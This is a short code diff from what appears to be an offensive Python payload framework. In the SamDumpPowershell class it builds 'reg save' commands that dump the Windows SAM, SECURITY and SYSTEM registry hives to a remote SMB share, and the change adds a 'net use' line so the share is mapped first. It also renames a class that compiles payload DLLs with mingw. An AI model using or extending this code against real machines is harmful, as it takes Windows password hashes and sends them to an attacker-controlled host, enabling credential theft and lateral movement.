@@ -70,10 +70,11 @@ class SamDumpPowershell(Payload):
         self.system = self.smb_server_object.future_file()
         self.output_files += [self.sam, self.security, self.system]
         powershell_command = f"reg save hklm\\sam {self.sam.remote_path}\nreg save hklm\\security {self.security.remote_path}\nreg save hklm\\system {self.system.remote_path}"
+        powershell_command = self.smb_server_object.net_use_string() + "\n" + powershell_command
         self.payload = powershell_command
 
 
-class CRunPowershell(Payload):
+class CRunPowershellDll(Payload):
     ext = ".dll"
     compiler = "/usr/bin/x86_64-w64-mingw32-gcc"
 
